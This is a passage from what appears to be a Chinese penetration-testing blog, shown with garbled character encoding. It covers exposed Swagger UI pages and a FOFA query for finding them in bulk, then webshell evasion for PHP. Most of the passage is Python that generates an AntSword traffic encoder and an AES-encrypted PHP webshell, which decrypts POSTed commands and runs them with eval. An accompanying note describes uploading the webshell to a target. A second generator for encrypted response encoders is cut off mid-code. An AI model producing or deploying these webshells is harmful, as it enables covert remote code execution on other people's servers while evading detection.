<li><p>OpenApiæ˜¯ä¸€å¥—ç”¨æ¥ä»‹ç»å’Œç®€å•æµ‹è¯•ç½‘ç«™ä¸­ä½¿ç”¨åˆ°çš„apiçš„è§„èŒƒï¼Œå¾ˆå¤šçš„åç«¯æ¡†æ¶éƒ½éµå¾ªè¿™å¥—è§„èŒƒå¼€å‘å‡ºäº†è‡ªå·±apiæµ‹è¯•&#x2F;è¯´æ˜çš„å°å·¥å…·ï¼Œæ¯”å¦‚SpringBootçš„SpringDocã€DRFï¼ˆDjango Rest Frameworkï¼‰çš„drf-spectacularã€Flaskçš„flask-restxå’Œflask-openapi3ã€NodeJsçš„swagger-jsdocç­‰ç­‰ã€‚å¹¶ä¸”ï¼ŒOpenApiå®˜æ–¹è¿˜é»˜è®¤æä¾›äº†ä¸€ä¸ªå‰ç«¯é¡µé¢ï¼Œç”¨æ¥åœ¨çº¿æµè§ˆå’Œæµ‹è¯•apiæ¥å£ï¼Œå¾ˆå¤šå®ç°OpenApiçš„å·¥å…·é»˜è®¤éƒ½é‡‡ç”¨è¿™ä¸ªé¡µé¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå®ç°OpenApiçš„å·¥å…·&#x2F;æœåŠ¡æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼ˆåŠŸèƒ½æ¯”è¾ƒå•ä¸€ï¼‰ï¼Œä½†æ˜¯è¯¥é¡µé¢&#x2F;æ¥å£åœ°å€ä¸åº”å½“è¢«å…¬å¼€ï¼ˆæœªæˆæƒè®¿é—®ï¼‰ï¼Œéœ€è¦è®¤è¯åæ‰èƒ½è®¿é—®ï¼Œå¦åˆ™å¾ˆå®¹æ˜“æ³„éœ²ä¸€äº›æ•æ„Ÿçš„ã€æœ‰æ¼æ´çš„apiæ¥å£ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110133414687.png" alt="image-20251110133414687"></p>
</li>
<li><p>OpenApiè§„èŒƒæœ€å¼€å§‹å«åšswaggerï¼Œä»2.0ç‰ˆæœ¬ï¼ˆ2014å¹´ï¼‰å¼€å§‹æ­£å¼æ›´åä¸ºOpenApiã€‚å¦‚ä¸Šé¢æ‰€è®²ï¼Œä¸åŒæ¡†æ¶éƒ½æœ‰è‡ªå·±å®ç°OpenApiè§„èŒƒçš„å°ç»„ä»¶ï¼Œä½†åŸºæœ¬ä¸Šéƒ½é»˜è®¤é‡‡ç”¨OpenApiå®˜æ–¹ç»™å‡ºçš„é¡µé¢ä½œä¸ºæµ‹è¯•ç•Œé¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡fofaæ‰¹é‡æŸ¥æ‰¾è¿™ä¸ªé¡µé¢ï¼štitle&#x3D;â€Swagger UIâ€</p>
</li>
<li><p>å¦‚æœå·²ç»æœªæˆæƒè®¿é—®åˆ°äº†swagger uiç•Œé¢ï¼Œé‚£ä¹ˆå¯ä»¥æ‰¹é‡æµ‹è¯•å…¶ä¸­çš„apiï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„è§„èŒƒï¼Œæ‰€ä»¥ä¸ç®¡ä½ çš„åç«¯æ˜¯javaè¿˜æ˜¯golangæˆ–è€…å…¶ä»–è¯­è¨€ï¼Œåªè¦æŒ‰ç…§è¿™ä¸ªæ ‡å‡†å®ç°äº†SwaggerUIä¸­çš„åŠŸèƒ½ï¼Œä¸”æ³„éœ²äº†è¿™ä¸ªé¡µé¢ï¼Œå°±ä¼šæˆä¸ºå…¶ä»–æ¼æ´æŒ–æ˜&amp;åˆ©ç”¨çš„ä¸€ä¸ªèµ·ç‚¹ï¼šæ¥å£æ–‡æ¡£åœ°å€ï¼ˆä¸€èˆ¬åœ¨swagger uiç•Œé¢ä¸Šä¼šæœ‰æç¤ºï¼Œæ”¹åœ°å€ä»¥çº¯æ–‡æœ¬çš„å½¢å¼è¿”å›æ‰€æœ‰çš„apiæ¥å£ï¼‰&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xrayã€‚</p>
</li>
</ol>
<h3 id="ä¸­é—´ä»¶æ¼æ´"><a href="#ä¸­é—´ä»¶æ¼æ´" class="headerlink" title="ä¸­é—´ä»¶æ¼æ´"></a>ä¸­é—´ä»¶æ¼æ´</h3><h2 id="Webshellå…æ€"><a href="#Webshellå…æ€" class="headerlink" title="Webshellå…æ€"></a>Webshellå…æ€</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
<li><p>æµé‡å…æ€</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_id</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">8</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;_0x<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits.lower(), k=length))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">pwd: <span class="built_in">str</span>, algorithm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ ¹æ®ç®—æ³•ç”Ÿæˆç¬¦åˆé•¿åº¦çš„å¯†é’¥&quot;&quot;&quot;</span></span><br><span class="line">    key_length_map = &#123;</span><br><span class="line">        <span class="string">&#x27;aes-128-cbc&#x27;</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="string">&#x27;aes-192-cbc&#x27;</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">&#x27;aes-256-cbc&#x27;</span>: <span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">    key_length = key_length_map[algorithm]</span><br><span class="line">    </span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">    iterations = <span class="number">100000</span></span><br><span class="line">    key = PBKDF2(pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>), salt, dkLen=key_length, count=iterations)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key.<span class="built_in">hex</span>(), salt.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_scripts</span>(<span class="params">args</span>):</span><br><span class="line">    key_hex, salt_hex = generate_key(args.pwd, args.algorithm)</span><br><span class="line">    random_id = generate_random_id()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è§£æç®—æ³•ä½æ•°ï¼ˆä¿®å¤é™¤æ³•é”™è¯¯ï¼‰</span></span><br><span class="line">    algo_bits = <span class="built_in">int</span>(args.algorithm.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>])  <span class="comment"># æå–128/192/256å¹¶è½¬ä¸ºæ•´æ•°</span></span><br><span class="line">    key_byte_length = algo_bits // <span class="number">8</span>  <span class="comment"># è®¡ç®—å­—èŠ‚é•¿åº¦ï¼ˆ128/8=16ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‰ç«¯JavaScriptè„šæœ¬</span></span><br><span class="line">    frontend_content = <span class="string">f&#x27;&#x27;&#x27;/**</span></span><br><span class="line"><span class="string"> * å‰ç«¯AESåŠ å¯†è„šæœ¬ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦ï¼‰</span></span><br><span class="line"><span class="string"> * å¯†ç ï¼š<span class="subst">&#123;args.pwd&#125;</span> | ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = (pwd, data, ext = &#123;&#123;&#125;&#125;) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">    const algorithm = &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">    const salt = Buffer.from(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string">    // æ´¾ç”Ÿç¬¦åˆé•¿åº¦çš„å¯†é’¥</span></span><br><span class="line"><span class="string">    const key = crypto.pbkdf2Sync(pwd, salt, 100000, <span class="subst">&#123;algo_bits / <span class="number">8</span>&#125;</span>, &#x27;sha256&#x27;);</span></span><br><span class="line"><span class="string">    const iv = crypto.randomBytes(16);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    const randomID = &quot;<span class="subst">&#123;random_id&#125;</span>&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åŠ å¯†åŸå§‹payload</span></span><br><span class="line"><span class="string">    const originalPayload = data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    const cipherPayload = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPayload = cipherPayload.update(originalPayload, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPayload += cipherPayload.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[randomID] = `$&#123;&#123;encryptedPayload&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åç«¯æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="string">    const execCode = `</span></span><br><span class="line"><span class="string">        $data = explode(&#x27;|&#x27;, $_POST[&#x27;<span class="subst">&#123;random_id&#125;</span>&#x27;]);</span></span><br><span class="line"><span class="string">        $encrypted = base64_decode($data[0]);</span></span><br><span class="line"><span class="string">        $iv = base64_decode($data[1]);</span></span><br><span class="line"><span class="string">        $salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">            &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $salt, </span></span><br><span class="line"><span class="string">            100000, </span></span><br><span class="line"><span class="string">            <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">            true</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        $decrypted = openssl_decrypt(</span></span><br><span class="line"><span class="string">            $encrypted, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $key, </span></span><br><span class="line"><span class="string">            OPENSSL_RAW_DATA, </span></span><br><span class="line"><span class="string">            $iv</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        eval($decrypted);</span></span><br><span class="line"><span class="string">    `.replace(/\s+/g, &#x27; &#x27;).trim();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åŠ å¯†æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="string">    const cipherPwd = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPwd = cipherPwd.update(execCode, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPwd += cipherPwd.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[pwd] = `$&#123;&#123;encryptedPwd&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    delete data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    return data;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åç«¯PHPè„šæœ¬</span></span><br><span class="line">    backend_content = <span class="string">f&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * åç«¯AESè§£å¯†è„šæœ¬ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦ï¼‰</span></span><br><span class="line"><span class="string"> * å¯†ç ï¼š<span class="subst">&#123;args.pwd&#125;</span> | ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedData = $_POST[&#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;] ?? &#x27;&#x27;;</span></span><br><span class="line"><span class="string">if (empty($encryptedData)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Missing parameter: <span class="subst">&#123;args.pwd&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">list($encryptedPwd64, $ivB64) = explode(&#x27;|&#x27;, $encryptedData, 2);</span></span><br><span class="line"><span class="string">if (empty($encryptedPwd64) || empty($ivB64)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&quot;Parameter&#x27;s format is failed!&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedPwd = base64_decode($encryptedPwd64);</span></span><br><span class="line"><span class="string">$iv = base64_decode($ivB64);</span></span><br><span class="line"><span class="string">$salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">$key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">    &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">    $salt, </span></span><br><span class="line"><span class="string">    100000, </span></span><br><span class="line"><span class="string">    <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">    true</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$decryptedCode = openssl_decrypt(</span></span><br><span class="line"><span class="string">    $encryptedPwd,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;,</span></span><br><span class="line"><span class="string">    $key,</span></span><br><span class="line"><span class="string">    OPENSSL_RAW_DATA,</span></span><br><span class="line"><span class="string">    $iv</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">if ($decryptedCode === false) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Decription is failed!&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval($decryptedCode);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    os.makedirs(args.output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    frontend_path = os.path.join(args.output_dir, <span class="string">&#x27;frontend_encrypt.js&#x27;</span>)</span><br><span class="line">    backend_path = os.path.join(args.output_dir, <span class="string">&#x27;backend_decrypt.php&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(frontend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(frontend_content)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(backend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(backend_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;âœ… è„šæœ¬ç”ŸæˆæˆåŠŸï¼&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å‰ç«¯è„šæœ¬ï¼š<span class="subst">&#123;frontend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;åç«¯è„šæœ¬ï¼š<span class="subst">&#123;backend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span>ï¼ˆå¯†é’¥é•¿åº¦æ­£ç¡®ï¼‰&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;AESè„šæœ¬ç”Ÿæˆå™¨ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦é—®é¢˜ï¼‰&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--pwd&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;åŒæ­¥å¯†ç ï¼ˆå¦‚anonymousï¼‰&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;./generated_scripts&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç›®å½•&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--algorithm&#x27;</span>, </span><br><span class="line">        default=<span class="string">&#x27;aes-256-cbc&#x27;</span>, </span><br><span class="line">        choices=[<span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="string">&#x27;aes-192-cbc&#x27;</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&#x27;AESç®—æ³•ï¼ˆé»˜è®¤aes-256-cbcï¼‰&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    generate_scripts(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">frontend_encrypt.js: èšå‰‘çš„ç¼–ç å™¨ï¼Œç”¨äºåŠ å¯†èšå‰‘æµé‡ä¸­çš„å‚æ•°ï¼Œæ–°å¢åˆ°èšå‰‘çš„ç¼–ç å™¨ä¸­ï¼Œåˆ›å»ºç›®æ ‡æ—¶é€‰æ‹©è¿™ä¸ª</span><br><span class="line">backend_decrypt.php: webshellï¼Œæ¥æ”¶ã€è§£å¯†ã€æ‰§è¡Œèšå‰‘çš„æŒ‡ä»¤ï¼Œä¸å…æ€ï¼Œåšå…æ€åä¸Šä¼ åˆ°é¶æ ‡ä¸­</span><br></pre></td></tr></table></figure>

 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">Dict</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_algorithm_info</span>(<span class="params">algorithm: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è·å–ç®—æ³•å¯¹åº”çš„é»˜è®¤å¯†é’¥é•¿åº¦å’Œå‘é‡é•¿åº¦&quot;&quot;&quot;</span></span><br><span class="line">    algo_info = &#123;</span><br><span class="line">        <span class="comment"># ç®—æ³•: (å¯†é’¥é•¿åº¦å­—èŠ‚, å‘é‡é•¿åº¦å­—èŠ‚)</span></span><br><span class="line">        <span class="string">&quot;aes-128-cbc&quot;</span>: (<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-cbc&quot;</span>: (<span class="number">32</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-128-gcm&quot;</span>: (<span class="number">16</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-gcm&quot;</span>: (<span class="number">24</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-gcm&quot;</span>: (<span class="number">32</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;des-ede3-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">8</span>),  <span class="comment"># 3DES</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> algorithm <span class="keyword">not</span> <span class="keyword">in</span> algo_info:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;ä¸æ”¯æŒçš„ç®—æ³•: <span class="subst">&#123;algorithm&#125;</span>ï¼Œæ”¯æŒçš„ç®—æ³•: <span class="subst">&#123;<span class="built_in">list</span>(algo_info.keys())&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> algo_info[algorithm]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_key</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆæŒ‡å®šé•¿åº¦çš„éšæœºå¯†é’¥ï¼ˆåŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    chars = string.ascii_letters + string.digits + <span class="string">&#x27;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?`~&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_encryption_script</span>(<span class="params"></span></span><br><span class="line"><span class="params">    algorithm: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    key: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    iv: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    key_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    iv_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    encode_final: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    output_file: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆåŠ å¯†è§£å¯†è„šæœ¬&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è·å–ç®—æ³•é»˜è®¤å‚æ•°</span></span><br><span class="line">    default_key_len, default_iv_len = get_algorithm_info(algorithm)</span><br><span class="line">    key_length = key_length <span class="keyword">or</span> default_key_len</span><br><span class="line">    iv_length = iv_length <span class="keyword">or</span> default_iv_len</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¤„ç†å¯†é’¥</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != key_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;å¯†é’¥é•¿åº¦å¿…é¡»ä¸º <span class="subst">&#123;key_length&#125;</span> å­—èŠ‚ï¼Œå½“å‰ä¸º <span class="subst">&#123;<span class="built_in">len</span>(key)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = generate_random_key(key_length)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¤„ç†å‘é‡</span></span><br><span class="line">    <span class="keyword">if</span> iv:</span><br><span class="line">        <span class="comment"># å‘é‡ä»¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¼ å…¥ï¼Œéœ€éªŒè¯åŸå§‹å­—èŠ‚é•¿åº¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(iv) != iv_length * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;å‘é‡åå…­è¿›åˆ¶å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»ä¸º <span class="subst">&#123;iv_length*<span class="number">2</span>&#125;</span>ï¼Œå½“å‰ä¸º <span class="subst">&#123;<span class="built_in">len</span>(iv)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># ç”Ÿæˆéšæœºå‘é‡ï¼ˆåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">        iv = os.urandom(iv_length).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”ŸæˆPHPåŠ å¯†å‡½æ•°ï¼ˆå¤„ç†æ¢è¡Œå’Œç©ºæ ¼ï¼‰</span></span><br><span class="line">    php_encrypt = <span class="string">f&quot;&quot;&quot;function asenc($out) &#123;&#123;</span></span><br><span class="line"><span class="string">        $key = &#x27;<span class="subst">&#123;key&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">        $iv = hex2bin(&#x27;<span class="subst">&#123;iv&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $blockSize = openssl_cipher_iv_length(&#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $pad = $blockSize - (strlen($out) % $blockSize);</span></span><br><span class="line"><span class="string">        $out .= str_repeat(chr($pad), $pad);</span></span><br><span class="line"><span class="string">        $encrypted = openssl_encrypt($out, &#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;, $key, OPENSSL_RAW_DATA, $iv);</span></span><br><span class="line"><span class="string">        return <span class="subst">&#123;encode_final&#125;</span>_encode($encrypted);</span></span><br><span class="line"><span class="string">    &#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># æ‰‹åŠ¨å¤„ç†PHPå‡½æ•°çš„ç©ºæ ¼å’Œæ¢è¡Œï¼ˆé¿å…ä½¿ç”¨æ­£åˆ™åœ¨f-stringä¸­å†²çªï¼‰</span></span><br><span class="line">    php_encrypt_clean = <span class="string">&#x27; &#x27;</span>.join(php_encrypt.split())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”ŸæˆJavaScriptè„šæœ¬ï¼ˆä½¿ç”¨å¸¸è§„å­—ç¬¦ä¸²æ‹¼æ¥é¿å…f-stringå†²çªï¼‰</span></span><br><span class="line">    js_script = <span class="string">&#x27;&#x27;&#x27;&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// åŠ å¯†é…ç½®: &#123;algorithm&#125; | å¯†é’¥é•¿åº¦: &#123;key_length&#125;å­—èŠ‚ | å‘é‡é•¿åº¦: &#123;iv_length&#125;å­—èŠ‚</span></span><br><span class="line"><span class="string">const ENCRYPTION_KEY = &#x27;&#123;key&#125;&#x27;;</span></span><br><span class="line"><span class="string">const IV = Buffer.from(&#x27;&#123;iv&#125;&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = &#123;&#123;</span></span><br><span class="line"><span class="string">    asoutput: () =&gt; &quot;&#123;php_encrypt_clean&#125;&quot;&quot;,</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    decode_buff: (buff) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">        const encrypted = Buffer.from(buff.toString(), &#x27;&#123;encode_final&#125;&#x27;);</span></span><br><span class="line"><span class="string">        const decipher = crypto.createDecipheriv(&#x27;&#123;algorithm&#125;&#x27;, ENCRYPTION_KEY, IV);</span></span><br><span class="line"><span class="string">        let decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);</span></span><br><span class="line"><span class="string">        // å»é™¤PKCS7å¡«å……</span></span><br><span class="line"><span class="string">        const pad = decrypted[decrypted.length - 1];</span></span><br><span class="line"><span class="string">        return decrypted.slice(0, decrypted.length - pad);</span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">&#125;&#125;;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        algorithm=algorithm,</span><br><span class="line">        key_length=key_length,</span><br><span class="line">        iv_length=iv_length,</span><br><span class="line">        key=key,</span><br><span class="line">        iv=iv,</span><br><span class="line">        